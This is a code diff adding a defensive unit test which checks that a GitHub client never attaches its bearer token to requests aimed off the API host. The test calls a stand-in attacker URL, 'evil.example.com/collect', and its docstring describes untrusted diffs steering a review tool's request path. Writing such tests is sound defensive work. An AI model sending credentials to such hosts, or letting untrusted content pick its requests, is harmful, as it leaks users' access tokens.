@@ -41,6 +41,19 @@ def test_call_sends_the_token_and_the_json_body(monkeypatch):
 	assert headers[-1]["Authorization"] == "Bearer gho_x"
 
 
+def test_the_token_never_leaves_the_api_host(monkeypatch):
+	"""A review reads untrusted diffs and picks the path it asks for; an absolute URL must not carry the
+	token off-host. github.call takes one because GRAPHQL is absolute, so the header is what is guarded."""
+	monkeypatch.setenv("GH_TOKEN", "gho_x")
+	headers, req = [], github.urllib.request.Request
+	monkeypatch.setattr(github.urllib.request, "Request", lambda *a, **kw: headers.append(kw["headers"]) or req(*a, **kw))
+	monkeypatch.setattr(github.urllib.request, "urlopen", fake_http(lambda url, body: "{}"))
+	github.call("https://evil.example.com/collect")
+	assert "Authorization" not in headers[-1]
+	github.call(github.GRAPHQL, "POST", {"query": "{a}"})  # the API's own absolute url still gets it
+	assert headers[-1]["Authorization"] == "Bearer gho_x"
+
+
 def test_call_turns_an_http_error_into_an_oserror_with_githubs_message(monkeypatch):
 	import io
 	import urllib.error
